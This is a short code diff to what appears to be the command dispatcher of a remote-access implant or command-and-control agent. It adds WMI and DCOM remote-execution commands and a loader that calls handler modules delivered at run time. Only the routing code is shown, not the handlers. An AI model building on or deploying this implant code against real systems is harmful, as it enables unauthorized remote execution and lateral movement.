@@ -268,7 +268,24 @@ auto declfn dispatch_command(
 #ifdef INCLUDE_CMD_INLINE_EXECUTE
         case CMD_INLINE_EXECUTE: cmd_inline_execute( inst, task_uuid, params ); return;
 #endif
+#ifdef INCLUDE_CMD_LOAD
+        case CMD_LOAD: cmd_load( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_WMIEXEC
+        case CMD_WMIEXEC: cmd_wmiexec( inst, task_uuid, params ); return;
+#endif
+#ifdef INCLUDE_CMD_DCOMEXEC
+        case CMD_DCOMEXEC: cmd_dcomexec( inst, task_uuid, params ); return;
+#endif
         default: break;
+    }
+
+    for ( uint32_t i = 0; i < inst.loaded.count; i++ ) {
+        if ( inst.loaded.entries[i].active && inst.loaded.entries[i].cmd_id == cmd_id ) {
+            auto handler = reinterpret_cast<CmdHandlerFn>( inst.loaded.entries[i].handler );
+            handler( inst, task_uuid, params );
+            return;
+        }
     }
 
     DBG_PRINT( inst, "unknown command: 0x%02x\n", cmd_id );
